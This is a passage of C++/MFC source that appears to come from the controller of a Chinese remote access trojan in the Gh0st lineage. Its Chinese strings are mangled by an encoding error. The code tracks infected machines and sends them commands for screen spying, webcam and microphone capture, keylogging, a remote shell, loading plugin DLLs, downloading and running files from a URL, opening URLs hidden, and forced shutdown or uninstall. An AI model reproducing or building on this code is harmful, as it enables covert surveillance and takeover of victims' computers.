		else
			OSNumber = _T("32");
		strOS.Format
			(
			_T("%s SP%d x%s"),// (Build %d)
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor,
			//LoginInfo->OsVerInfoEx.dwBuildNumber
			OSNumber
			);
		m_pListCtrl->SetItemText(i, 6, strOS);

		//�û�״̬
		if (LoginInfo->bIsActive)
			m_pListCtrl->SetItemText(i, 7, _T(" ���� "));
		else
			m_pListCtrl->SetItemText(i, 7, _T(" ���� "));
		
		// CPU
		str.Format(_T("%d��%dMHz"), LoginInfo->nCPUNumber,LoginInfo->dwCPUClockMhz);
		m_pListCtrl->SetItemText(i, 8, str);

		// ����
		if (LoginInfo->Speed >= 1000)
			str.Format("%dGbps", LoginInfo->Speed/1000);
		else
			str.Format("%dMbps", LoginInfo->Speed);
		m_pListCtrl->SetItemText(i, 9, str);
		// ������
		m_pListCtrl->SetItemText(i, 10, LoginInfo->HostName);
		// Ӳ�� �ڴ�
		str.Format(_T("%.0fGB/%.2fGB"), (float)(LoginInfo->DriverSize) / 1024,(float)LoginInfo->MemSize/1024);
		m_pListCtrl->SetItemText(i, 11, str);

	
		
		// Speed
		str.Format(_T("%d"), LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 12, str);
		
		// ��Ƶ
		str = LoginInfo->bIsWebCam ? _T(" ��") : _T(" -/-");
		m_pListCtrl->SetItemText(i, 13, str);
		
		// ɸѡ
		m_pListCtrl->SetItemText(i, 14, " -/-");
		
		// �汾��Ϣ
		m_pListCtrl->SetItemText(i, 15, LoginInfo->szVersion);
		
		// ����װʱ��
		str.Format("%s", LoginInfo->MarkTime);
		m_pListCtrl->SetItemText(i, 16, str);
		
		// ����ʱ��
		m_pListCtrl->SetItemText(i, 17, LoginInfo->RunTime);

		// ���ӷ�ʽ
        if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
        {
            m_pListCtrl->SetItemText(i, 18, _T("WAN ����"));
        }
        else
        {
            m_pListCtrl->SetItemText(i, 18, LoginInfo->sznet);
        }
		
		// ������ʾ
		strToolTipsText.Format("������: %s\nIP��ַ: %s\n����: %s\nϵͳ: %s\n��Ƶ: %s\nɱ��: %s",LoginInfo->HostName,WanIPAddress,m_pListCtrl->GetItemText(i,0),strOS,LoginInfo->bIsWebCam?_T("��"):_T("��"),LoginInfo->Virus);
		
		// ָ��Ψһ��ʶ
		m_pListCtrl->SetItemData(i, (DWORD) pContext);
		
		if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);
		
		strLogText.Format("��������: [%s]   OS: [%s]   Ver: [%s]   ����: [%s]",WanIPAddress,strOS,LoginInfo->szVersion,m_pListCtrl->GetItemText(i,0));
	//	g_pLogView->InsertLogItem(strLogText, 2, 0);
		g_pLogView->InsertLogItem("�������ߣ�",strLogText, 0, 1 );
		
		//��������/////////////////////////////////////////////////////////////////
		BOOL a_chk = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
		if (a_chk != true)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}
		//////////////////////////////////////////////////////////////////////////
		
		////////////////////////////////////////�ظ���������////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ )
		{
			if( m_pListCtrl->GetItemText( nCnt , 3 ) == m_pListCtrl->GetItemText( Tmpi , 3 ))
			{ //���ж�����IP
				if( m_pListCtrl->GetItemText( nCnt , 4 ) == m_pListCtrl->GetItemText( Tmpi , 4 ))
				{ //���ж�����IP
					CString strOSCount;
					strOSCount = m_pListCtrl->GetItemText( i, 6 );
					if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}
					if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
					}
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}
					if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}
					if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}
					if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}
					if ( strOSCount.Find(_T("Win7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}
					if ( strOSCount.Find(_T("Win8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}
					if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}
					if ( strOSCount.Find(_T("Win10")) != -1 )
					{
						g_pFrame->nOSCount[9]--;
					}
					if ( strOSCount.Find(_T("2016")) != -1 )
					{
						g_pFrame->nOSCount[10]--;
					}
					//  
					m_pListCtrl->DeleteItem(Tmpi);
					g_pFrame->m_nCount--;
				}
			}
		}
	}
	catch(...){}
	
	// ���µ�ǰ��������
	g_pFrame->ShowOSCount();
	g_pFrame->ShowConnectionsNumber();
	g_pTabView->UpDateNumber();
	return 0;
}

int CClientView::FindCountry(CString local)
{
	
	CString country[]={
		"�й�","����������","����������","������","����͢","��������������","������","����","�����ݽ�","����",
		"���������","������","��ɳ����","������","������","����ϺͰͲ���","�µ���","�Ĵ�����","����","�ͰͶ�˹",
		"�Ͳ����¼�����","�͹���","�ͻ�˹̹","������","����˹̹","����","������","����","�׶���˹","��������",
		"��������Լ��֯","����","����ʱ","����","����","��˹���Ǻͺ�����ά��","����ά��","��������","����","�����ɷ���",
		"��¡��","����","���������","����","�¹�","������","�����ǹ���Э��","�������ҹ�Э","���","�������",
		"�������","����˹","��϶��","����������","����","��ٸ�","���ɱ�","쳼�","����","��ý�",
		"�Ա���","�չ�(��)","�չ�","���ױ���","��˹�����","�����ɴ�","��³����","�Ű�","������","��Э",
		"������˹̹","����","����","����","�鶼��˹","�����˹","������","������˹˹̹","������","�����Ǳ���",
		"���ձȺ���ͬ��","���ô�","����","����","����կ","�ݿ�","��Ͳ�Τ","����¡","������","��Ħ��",
		"���ص���","������","���޵���","������","����ά��","������","����","�����","������","���ȹ���",
		"������","���Ϲ�","��֧��ʿ��","¬ɭ��","¬����","��������","����˹��","�������","�����","����ά",
		"��������","����","�����","���ܶ�Ⱥ��","ë����˹","ë��������","����","����������֯","�ɹ�","�ϼ���",
		"��³","�ܿ�������������","���","Ħ������","Ħ���","Ħ�ɸ�","Īɣ�ȿ�","ī����","���ױ���","�Ϸ�",
		"�³","�Ჴ��","�������","���ն�","��������","Ų��","ŷ������","����","������","�ձ�",
		"���","��ʿ","�����߶�","����ά��","��������","���ڼӶ�","����·˹","�����","ɳ�ذ�����","ʥ��������������",
		"ʥ���ĺ���ά˹","ʥ¬����","ʥ����ŵ","ʥ��ɭ�غ͸����ɶ�˹","˹������","˹�工��","˹��������","˹��ʿ��","�յ�","������",
		"������Ⱥ��","������","������˹̹","̫ƽ��ͬ��","̩��","̹ɣ����","����","�������Ͷ�͸�","ͻ��˹","ͼ��¬",
		"������","������˹̹","��Ŭ��ͼ","Σ������","ί������","����","�ڸɴ�","�ڿ���","������","���ȱ��˹̹",
		"������","����Ħ��","ϣ��","���","�¼���","������","������","������","�����","��������",
		"Ҳ��","������","����","��ɫ��","�����","ӡ��","ӡ��������","Ӣ����","Ӣ��","Լ��",
		"Խ��","�ޱ���","է��","����","�з�","̨��ʡ","�������",
		"�Ҳ���IP���ݿ�"};
		
		int i;
		CString str;
		int len = strlen(local);
		for(i=0; i<len; i++)
		{
			if(local[i] == ' ')
			{
				break;
			}
		}
		CString strlocal = local.Left(i);  //��ȡǰ���ַ���
		
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //�ȱȽ��ַ��������Ƿ�ɹ�
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				int s0 = strlen(strlocal);
				int s1 = strlen(str);
				if(s0==s1)
					return i;
			}
		}
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //�ٱȽ��ַ�
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				if (strstr(strlocal,"���ɹ�")!=NULL)
					return 0;
				return i;
			}
		}
		return 0;
}

LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// ɾ����������п��ܻ�ɾ��Context
	CClientView* pView = NULL;
	CString strLogText,strDiLi,IPaddress,strOSCount;
	
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		try
		{
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for (int i = 0; i < nCnt; i++)
			{
				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
				{
					strLogText.Format("��������: [%s]   OS: [%s]   Ver: [%s]   ����: [%s]",pView->m_pListCtrl->GetItemText(i,3),pView->m_pListCtrl->GetItemText(i,6),pView->m_pListCtrl->GetItemText(i,15),pView->m_pListCtrl->GetItemText(i,0));
				//	g_pLogView->InsertLogItem(strLogText, 3, 1);
					g_pLogView->InsertLogItem("�������ߣ�",strLogText, 0, 2 );
					
					strOSCount = pView->m_pListCtrl->GetItemText( i, 5 );
					if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}
					if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
					}
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}
					if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}
					if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}
					if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}
					if ( strOSCount.Find(_T("Win7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}
					if ( strOSCount.Find(_T("Win8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}
					if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}
					if ( strOSCount.Find(_T("Win10")) != -1 )
					{
						g_pFrame->nOSCount[9]--;
					}
					if ( strOSCount.Find(_T("2016")) != -1 )
					{
						g_pFrame->nOSCount[10]--;
					}
					pView->m_pListCtrl->DeleteItem(i);
					g_pFrame->m_nCount--;
					
					//��������//////////////////////////////////////////////////////////////////
					BOOL a_chk = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
					if (a_chk != true)
					{
						PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
					}
					/////////////////////////////////////////////////////////////////////////
					break;
				}		
			}
			
			// �ر���ش���
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case CHAT_DLG:
			case SYSINFO_DLG:
			case REGEDIT_DLG:
			case SERMANAGER_DLG:
			case QQINFO_DLG:
			case DLL_DLG:
			case PROXYMAP_DLG:
				::PostMessage(((CDialog*)pContext->m_Dialog[1])->GetSafeHwnd(), WM_CLOSE, NULL, NULL);
				break;
			default:
				break;
			}
		}
		catch(...){}
	}
	
	// ���µ�ǰ��������
	g_pFrame->ShowOSCount();
	g_pFrame->ShowConnectionsNumber();
	g_pTabView->UpDateNumber();
	return 0;
}

void CClientView::OnChangeGroup() 
{
	// TODO: Add your command handler code here
	if(m_pListCtrl->GetSelectedCount() == NULL)
	{
		AfxMessageBox("��ѡ������!");
		return ;
	}
	CChangeGroup m_group;
	CString str;
	if ( m_group.DoModal() == IDOK )
	{	
		str = m_group.strGroup.GetBuffer(0);
		int	nPacketLength = str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete []lpPacket;
		
		CString strTemp, strGroupName;
		CClientView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( "%s(0)", m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->NewInitialUpdate();
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));			
			/////////////////�޸��ı���������ʾBUG/////////////////////////////////////////////////////////
			sockaddr_in sockAddr;
			memset(&sockAddr, 0, sizeof(sockAddr));
			int nSockAddrLen = sizeof(sockAddr);
			BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*) & sockAddr, &nSockAddrLen);
			CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

			/////////////////////////////////////////////////////////////////////////////////
			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			int nCnt = pView->m_pListCtrl->GetItemCount();
			int i = 0;
			
			if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "national", true) == 0)
			{
				if (LoginInfo->bIsWebCam)
				{
					i = pView->m_pListCtrl->InsertItem(nCnt, IPAddress, 0);
				}
				else
				{
					i = pView->m_pListCtrl->InsertItem(nCnt, IPAddress, 1);
				}
			}
			else
			{
				//����
				str = ((CClientApp *)AfxGetApp())->m_SeuQQwry.IPtoAddr(IPAddress);
				int countryno=FindCountry(str);
				i = pView->m_pListCtrl->InsertItem(nCnt, NULL, countryno);//ʹ��ָ��ͼ��
			}			
			////////////////////////////////////////////////////////////////////////////////			
			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));
			pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));
			pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));
			pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));
			pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));
			pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));
			pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));
			pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));
			pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));
			pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m, 9));
			pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));
			pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));
			pView->m_pListCtrl->SetItemText(i, 12, m_pListCtrl->GetItemText(m, 12));
			pView->m_pListCtrl->SetItemText(i, 13, m_pListCtrl->GetItemText(m, 13));
			pView->m_pListCtrl->SetItemText(i, 14, m_pListCtrl->GetItemText(m, 14));
			pView->m_pListCtrl->SetItemText(i, 15, m_pListCtrl->GetItemText(m, 15));
			pView->m_pListCtrl->SetItemText(i, 16, m_pListCtrl->GetItemText(m, 16));
			pView->m_pListCtrl->SetItemText(i, 17, m_pListCtrl->GetItemText(m, 17));
			pView->m_pListCtrl->SetItemText(i, 18, m_pListCtrl->GetItemText(m, 18));
			
			// ָ��Ψһ��ʶ
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			g_pFrame->ShowOSCount();
			
			g_pTabView->UpDateNumber();
			g_pFrame->ShowConnectionsNumber();
 		}
 	}
}

void CClientView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if ( pos == NULL)
	{
		return;
	}
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		m_iocpServer->Send(pContext, pData, nSize);	// ���ͻ���������б����ݰ�
	} 
}

LRESULT CClientView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// Settings������Ϊ����
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CClientView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// Settings������Ϊ����
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// Settings������Ϊ����
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// Settings������Ϊ����
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenDllDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CDllDlg	*dlg = new CDllDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ����
	dlg->Create(IDD_DLLDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = DLL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}


LRESULT CClientView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
LRESULT CClientView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// Settings������Ϊ����
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

#include "ProxyMapDlg.h"
LRESULT CClientView::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PROXYMAP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

void CClientView::SendDllCommand(LPCTSTR lpDllName, LPBYTE lparam, DWORD dwDataSize)
{
	CString strDllName;
	strDllName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("DLL", lpDllName);
	if (strDllName.GetLength()==0)
	{
		strDllName.Format("%s.dll", lpDllName);
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("DLL", lpDllName, strDllName);
	}
	int	nPacketLength = 1 + sizeof(DWORD) + strDllName.GetLength() + 1 + dwDataSize; //TOKEN(1)+��Ϣ��С+�ļ���(len+1)+��Ϣ����
	
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	memset(lpPacket,0,nPacketLength);
	lpPacket[0] = COMMAND_DLLMAIN;
	
	memcpy(lpPacket + 1, &dwDataSize, sizeof(DWORD));
	memcpy(lpPacket + 1 + sizeof(DWORD), strDllName.GetBuffer(0), strDllName.GetLength() + 1);
	memcpy(lpPacket + 1 + sizeof(DWORD) + strDllName.GetLength() + 1, lparam, dwDataSize);
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// ���ͻ���������б����ݰ�
		m_iocpServer->Send(pContext, lpPacket, nPacketLength);
	}
	delete[] lpPacket;
}

void CClientView::OnFileManager()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnWebcam() 
{
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	SendDllCommand("bPluginVideo",NULL,0);
}

void CClientView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnReStart()
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ�������������?"), _T("����"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_RESTART;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ��ж�ط������?"), _T("����"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnKeyboard() 
{
	// TODO: Add your command handler code here
// 	if (MessageBox(_T("ȷ���򿪼��̼�¼�𣿰�ȫ������ܻ����أ�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO)
// 		return;
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CClientView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnSerManager() 
{
	// TODO: Add your command handler code here
	
	//	OutputDebugString("������");
	BYTE	bToken = COMMAND_SERMANAGER;  // �������
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnRemoteShell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CClientView::OnLogoff() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ��ע���û���?"), _T("����"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CClientView::OnReboot() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("ȷ�������û���?"), _T("����"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CClientView::OnShutdown() 
{
	// TODO: Add your command handler code here
	
	if (MessageBox(_T("ȷ�Ϲرոû���?"), _T("����"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CClientView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CClientView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CClientView::OnOpenUrl(CHAR *IpBti,CHAR *IpurlDeta,int OpeUrl) 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(IpBti, IpurlDeta, this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	
	int		nPacketLength = 1 + dlg.m_str.GetLength() + 1;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = OpeUrl;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CClientView::OnDownExec() 
{
	// TODO: Add your command handler code here
	OnOpenUrl("Զ�����ص�ַ��","�����루�����ļ�����ַ:",COMMAND_DOWN_EXEC);
}

void CClientView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("���ظ��·����"), _T("������Ҫ�����·���˵ĵ�ַ:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("�������ַ���Ϸ�"), _T("����"));
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CClientView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here
	OnOpenUrl("Զ�̴���ַ��","������Ҫ�����أ����ʵ���ַ:",COMMAND_OPEN_URL_HIDE);
}

void CClientView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	OnOpenUrl("Զ�̴���ַ��","������Ҫ����ʾ�����ʵ���ַ:",COMMAND_OPEN_URL_SHOW);
}

TCHAR FileOpenPath[MAX_PATH];
char *CClientView::OnOpenFileName() 
{
	OPENFILENAME ofn;
	ZeroMemory(&ofn,sizeof(ofn));
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = m_hWnd;
	ofn.lpstrFile = FileOpenPath;
	ofn.lpstrFile[0] = _T('\0');
	ofn.nMaxFile = sizeof(FileOpenPath);
	ofn.lpstrFilter = _T("��ִ���ļ�(*.exe)\0*.exe\0�������ļ�(*.bat)\0*.bat\0�����ļ�(*.*)\0*.*\0\0");
	ofn.nFilterIndex = 1;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 0;
	ofn.lpstrInitialDir = NULL;
	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
	if (!GetOpenFileName(&ofn))
	{
		return NULL;
	}
	
	char *strFilen = FileOpenPath;
	return strFilen;
}

char *CClientView::OnOpenFileDll() 
{
	OPENFILENAME ofn;
	ZeroMemory(&ofn,sizeof(ofn));
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = m_hWnd;
	ofn.lpstrFile = FileOpenPath;
